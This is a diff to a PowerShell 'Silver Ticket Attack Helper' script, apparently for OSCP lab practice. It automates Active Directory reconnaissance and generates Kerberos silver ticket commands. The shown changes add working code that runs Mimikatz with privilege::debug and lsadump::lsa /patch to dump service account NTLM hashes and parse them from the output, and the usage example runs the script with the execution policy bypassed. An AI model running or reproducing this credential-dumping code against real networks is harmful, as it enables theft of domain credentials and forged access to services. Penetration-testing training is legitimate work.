@@ -4,18 +4,27 @@
     Silver Ticket Attack Helper - Recon & Command Generator (OSCP Safe)
 .DESCRIPTION
     Performs reconnaissance and generates exact commands for manual execution:
-    - Auto-detect domain & SID
-    - Enumerate all SPNs
-    - User selects target SPN
-    - Dump service account hash via Mimikatz
-    - Generate exact Mimikatz command for manual execution
-    - Provide verification steps
+    
+    Silver Ticket Attack Prerequisites:
+    1. SPN password hash (NTLM) - extracted from memory or LSA
+    2. Domain SID - auto-detected from current user
+    3. Target SPN - enumerated and user-selected
+    
+    This script automates:
+    - Domain & SID detection
+    - SPN enumeration (PowerView/setspn/LDAP)
+    - Hash extraction via Mimikatz (sekurlsa::logonpasswords)
+    - Command generation for manual ticket forging
+    
+    IMPORTANT: sekurlsa::logonpasswords requires the target service account
+    to have an active session on the current machine. If hash extraction fails,
+    script will fallback to lsadump::lsa /patch (requires SYSTEM/Domain Admin).
     
     NOTE: Does NOT auto-exploit (OSCP compliant)
 .NOTES
-    Requires: mimikatz_trunk.zip & Powerview in same folder (auto-extracted)
+    Requires: mimikatz_trunk.zip in same folder (auto-extracted)
 .EXAMPLE
-    .\silver_ticket_helper.ps1
+    powershell -NoProfile -ExecutionPolicy Bypass .\silver_ticket_helper.ps1
 #>
 
 param(
@@ -354,10 +363,65 @@ function Invoke-MimikatzDump {
         }
         
         if (-not $ntlmHash) {
-            Write-Fail "Could not extract NTLM hash for $TargetAccount"
-            Write-Info "Full Mimikatz output:"
-            Write-Host $output
-            exit 1
+            Write-Warn "Could not extract NTLM hash for $TargetAccount using sekurlsa::logonpasswords"
+            Write-Host ""
+            Write-Host "[!] POSSIBLE REASONS:" -ForegroundColor Yellow
+            Write-Host "    1. Service account '$TargetAccount' has NO active session on this machine" -ForegroundColor Gray
+            Write-Host "    2. Account is not currently logged on" -ForegroundColor Gray
+            Write-Host ""
+            Write-Host "[*] SOLUTIONS:" -ForegroundColor Cyan
+            Write-Host "    Option A: Find another machine where $TargetAccount has an active session" -ForegroundColor Gray
+            Write-Host "    Option B: Use lsadump::lsa /patch (requires SYSTEM or Domain Admin privileges)" -ForegroundColor Gray
+            Write-Host ""
+            
+            # Ask user if they want to try lsadump::lsa /patch
+            Write-Host "Do you want to try lsadump::lsa /patch? (y/n): " -NoNewline -ForegroundColor Yellow
+            $response = Read-Host
+            
+            if ($response -match '^[Yy]') {
+                Write-Info "Attempting lsadump::lsa /patch (may require elevated privileges)..."
+                Write-Command "$MimikatzPath privilege::debug lsadump::lsa /patch exit"
+                $output = & $MimikatzPath "privilege::debug" "lsadump::lsa /patch" "exit" 2>&1 | Out-String
+                
+                # Parse lsadump output (different format)
+                $lines = $output -split "`n"
+                $inTargetSection = $false
+                
+                for ($i = 0; $i -lt $lines.Count; $i++) {
+                    $line = $lines[$i]
+                    
+                    # Look for "User : TARGET_ACCOUNT" or "Account : TARGET_ACCOUNT"
+                    if ($line -match "User\s*:\s*$TargetAccount\s*$" -or $line -match "Account\s*:\s*$TargetAccount\s*$") {
+                        $inTargetSection = $true
+                        Write-Info "Found account section for $TargetAccount in lsadump output"
+                    }
+                    
+                    # Extract NTLM hash
+                    if ($inTargetSection -and $line -match "NTLM\s*:\s*([a-fA-F0-9]{32})") {
+                        $ntlmHash = $matches[1]
+                        Write-Success "Extracted NTLM hash via lsadump: $ntlmHash"
+                        break
+                    }
+                    
+                    # Reset section
+                    if ($inTargetSection -and ($line -match "^\s*User\s*:" -or $line -match "^\s*RID\s*:")) {
+                        if ($line -notmatch $TargetAccount) {
+                            $inTargetSection = $false
+                        }
+                    }
+                }
+                
+                if (-not $ntlmHash) {
+                    Write-Fail "Could not extract NTLM hash using lsadump::lsa /patch either"
+                    Write-Info "Full Mimikatz output:"
+                    Write-Host $output
+                    exit 1
+                }
+            } else {
+                Write-Fail "Cannot proceed without NTLM hash"
+                Write-Info "Please run this script on a machine where $TargetAccount has an active session"
+                exit 1
+            }
         }
         
         return $ntlmHash
